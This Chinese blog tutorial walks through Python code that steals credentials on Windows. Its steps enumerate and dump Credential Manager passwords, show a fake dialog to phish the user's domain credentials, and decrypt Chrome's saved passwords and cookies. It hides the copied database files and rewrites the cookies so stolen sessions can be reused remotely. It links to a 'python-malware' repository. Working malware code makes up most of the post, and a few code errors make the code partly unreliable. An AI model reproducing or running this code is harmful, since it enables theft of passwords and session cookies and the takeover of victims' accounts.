---
title: 窃取凭据与cookie
description: 使用python窃取windows凭据与chrome cookie.
categories:
 - python
tags: 
 - python
 - 渗透测试
---

#### 环境准备

`python3`

`pip install pypiwin32`

#### 导入所需要包

导入所需包和模块，并创建一个常量，用来调用某些凭据管理器相关功能时使用。

```python
import os
import io
import sqlite3
import shutil
import win32cred
import win32crypt
import win32api
import win32con
import pywintypes

CRED_TYPE_GENERIC = win32cred.CRED_TYPE_GENERIC
```

#### 从windows凭据管理器中存储通用凭据

通用凭据是非域凭据。如果你在windows上使用Git并通过GitHub，Bitbucket，Gitlab等进行身份验证，则凭据将存储在CredMan中。

首先导入枚举和读取凭据所需的功能。
```python
def dump_credsman_generic():
    CredEnumerate = win32cred.CredEnumerate
    CredRead = win32cred.CredRead
```
然后，我们枚举存储在凭据管理器中的凭据，并将其放入`creds`变量中，该变量是一个元组。
```python
try:
    creds = CredEnumerate(None, 0)  # 枚举凭证
except Exception:  # 避免在任何异常情况下崩溃
    pass
```
现在，我们要遍历每个凭据集，再添加到`credentials`列表中。
```python
credentials = []

for package in creds:
    try:
        target = package['TargetName']
        creds = CredRead(target, CRED_TYPE_GENERIC)
        credentials.append(creds)
    except pywintypes.error:
        pass
```
创建一个内存文本流，避免在磁盘上写文件，遍历`credentials`变量并将所需的数据写入文本流。
```python
credman_creds = io.StringIO()  # 内存中文本流

for cred in credentials:
    service = cred['TargetName']
    username = cred['UserName']
    password = cred['CredentialBlob'].decode('utf-8','ignore')

    credman_creds.write('Service: ' + str(service) + '\n')
    credman_creds.write('Username: ' + str(username) + '\n')
    credman_creds.write('Password: ' + str(password) + '\n')
    credman_creds.write('\n')

return credman_creds.getvalue()
```

![3_1](https://yui77111.github.io/assets/images/article/python/3_1.png)

#### 询问提示域凭据

通过社工方式，用`CredUIPromptForCredentials()`功能来显示一个对话框来询问用户，从而欺骗用户向我们提供其域凭据。

```python
def ask_domain_credentials():
    CredUIPromptForCredentials = win32cred.CredUIPromptForCredentials

    creds = []

    try:
        creds = CredUIPromptForCredentials(os.environ['userdomain'], 0, os.environ['username'], None, True, CRED_TYPE_GENERIC, {})
    except Exception:
        pass
    return creds
```

![3_2](https://yui77111.github.io/assets/images/article/python/3_2.png)

返回如下格式

![3_3](https://yui77111.github.io/assets/images/article/python/3_3.png)

#### 存储保存在Chrome中的密码

如果在保存凭据时未设置主密码，则访问数据库中的加密`Blob`可以使用`CrytUnprotectData`解密(因为windows上的Chrome使用`CrytUnprotectData WinAPI`函数对其进行加密，[参考](https://chromium.googlesource.com/chromium/chromium/+/master/chrome/browser/password_manager/encryptor_win.cc))，只要它在当前用户上下文中完成即可。这意味着你不能只是获取数据库并在具有不同用户的另一台计算机上打开它。
Chrome密码存在Login Data在%localappdata%\Google\User Data\Default\目录中名为Login Data数据库中。可以用DB Brower看到数据库的结构。

![3_4](https://yui77111.github.io/assets/images/article/python/3_4.png)

我们想查询：`action_urls`，`username_value`和`password_value`。字段`password_value`包含一个加密的`Blob`，我们将使用以下代码对其进行解密。
我们先制作数据库文件的本地副本，否则如果当Chrome正在运行，它将带有一个句柄并且数据库将被锁定。

```python
try:
    login_data = os.environ['localappdata'] + '\\Google\\Chrome\\User Data\\Default\\Login Data'
    shutil.copy2(login_data, './Login Data')  # 复制数据库到当前目录
    win32api.SetFileAttributes('./Login Data',win32con.FILE_ATTRIBUTE_HIDDEN)  # 在文件操作过程中不可见
except Exception:
    pass

chrome_credentials = io.StringIO()
```
现在，我们使用sqlite3库打开Login Data数据库的本地副本，并查询用户保存凭据。
```python
try:
    conn = sqlite3.connect('./Login Data', )                                        # 连接数据库
    cursor = conn.cursor()                                                          # 创建一个游标来获取数据
    cursor.execute('SELECT action_url, username_value, password_value FROM logins') # 查询
    results = cursor.fetchall()                                                     # 获取数据
    conn.close()                                                                    # 关闭数据库文件，使其不会被进程锁定
    os.remove('Login Data')  
"""
```
遍历获取到的数据并使用WinAPI函数`CryptUnprotectData`解密密码，最后返回保存好的内存中的文本流。
```python
    for action_url, username_value, password_value in results:
        password = win32crypt.CryptUnprotectData(password_value, None, None, None, 0)[1] # 使用CryptUnprotectData解密
        if password:                                                                       # 将凭据写进内存中的文本流
            chrome_credentials.write('URL: ' + action_url + '\n')
            chrome_credentials.write('Username: ' + username_value + '\n')
            chrome_credentials.write('Password: ' + str(password) + '\n')
            chrome_credentials.write('\n')
    return chrome_credentials.getvalue()                                                   # 返回内存中的文本流

except sqlite3.OperationalError as e:
    print(e)
    pass

except Exception as e:
    print(e)
```

![3_5](https://yui77111.github.io/assets/images/article/python/3_5.png)

#### 窃取Chrome Cookie

Chrome Cookie与存储在Chrome 的密码一样，为同目录下的Cookies文件并用`CryptProtectData`加密。但不同的是我们使用解密的cookie窃取整个数据库文件重写数据库内部的数据。然后，如果会话在服务器上尚未过期或用户尚未注销，则可以将该数据库上载到远程服务器，并在站点中用于进行身份验证。

```python
login_data = os.environ['localappdata'] + '\\Google\\Chrome\\User Data\\Default\\Cookies'  # cookies文件路径
shutil.copy2(login_data, './Cookies')  # 复制到当前路径
win32api.SetFileAttributes('./Cookies', win32con.FILE_ATTRIBUTE_HIDDEN)
try:
    conn = sqlite3.connect('./Cookies')  # 连接
    cursor = conn.cursor()
    cursor.execute('SELECT host_key, name, value, encrypted_value FROM cookies')  # 查询
    results = cursor.fetchall()  # 获取

    # 解密
    for host_key, name, value, encrypted_value in results:
        decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()

        # 使用解密的值更新文件
        cursor.execute("UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999,is_persistent = 1, is_secure = 0 WHERE host_key = ? AND name = ?"，(decrypted_value, host_key, name));

    conn.commit()  # 保存改变
    conn.close()  # 关闭文件，使其不被进程锁定

except Exception as e:
    print(e)
    pass
```

原cookies文件

![3_6](https://yui77111.github.io/assets/images/article/python/3_6.png)

新生成cookies文件

![3_7](https://yui77111.github.io/assets/images/article/python/3_7.png)


源代码已上传致[gayhub](https://github.com/yui77111/python-malware/blob/master/credentials and cookies/main.py)